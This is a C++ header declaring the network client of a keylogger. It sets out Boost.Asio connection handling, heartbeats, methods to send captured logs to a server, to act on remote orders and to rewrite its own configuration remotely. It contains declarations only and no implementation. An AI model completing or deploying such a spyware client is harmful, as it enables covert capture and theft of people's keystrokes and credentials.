#include <boost/asio/deadline_timer.hpp>
#include <boost/asio/io_service.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/read_until.hpp>
#include <boost/asio/streambuf.hpp>
#include <boost/asio/write.hpp>
#include <boost/bind.hpp>
#include "Keylogger.h"

using boost::asio::deadline_timer;
using boost::asio::ip::tcp;

#define DEFAULT_HOSTNAME "127.0.0.1"
#define DEFAULT_PORT "22"
#define CONF_FILE "conf.txt"
#define TMP_CONF_FILE "tmp_conf.txt"

#define CONNECTION	"100"
#define CONNECTION_OK "101"

class Client {
private:
	boost::asio::streambuf	_inputBuffer;
	deadline_timer			_heartbeatTimer;
	boost::asio::io_service &_io_service;
	// Client configuration
	int						_isAuth;
	std::string				_hostname;
	std::string				_port;
	Keylogger				&_keylogger;
	std::string				_clientID;

	bool StartConnect(tcp::resolver::iterator endpoint_iter);
	void HandleConnect(const boost::system::error_code& ec, tcp::resolver::iterator endpoint_iter);
	void StartRead();
	void HandleRead(const boost::system::error_code& ec);
	void StartWrite(void);
	void HandleWriteErrors(const boost::system::error_code& ec);
	// Functions to communicate
	void HandleOrder(const std::string &str);
	void Write(std::string &log);
	void SendPing(std::string &log);
	void SendData(std::string &log);
	// Functios for client configuration
	void InitConf(void);
	void ReadConf(void);
	void EditConf(int &line, std::string &value);
public:
	HANDLE					*_ghMutex;
	tcp::socket				_socket;
	tcp::resolver			_tcpResolver;

	Client(boost::asio::io_service &io_service, Keylogger &keylogger)
		: _isAuth(0), _tcpResolver(io_service), _socket(io_service),
		_heartbeatTimer(io_service), _io_service(io_service), _keylogger(keylogger) {
		this->ReadConf();
	}
	std::string& GetHostname(void) {
		return this->_hostname;
	}
	std::string& GetPort(void) {
		return this->_port;
	}

	bool Start(tcp::resolver::iterator endpoint_iter, HANDLE *ghMutex);
	void Stop(void);
};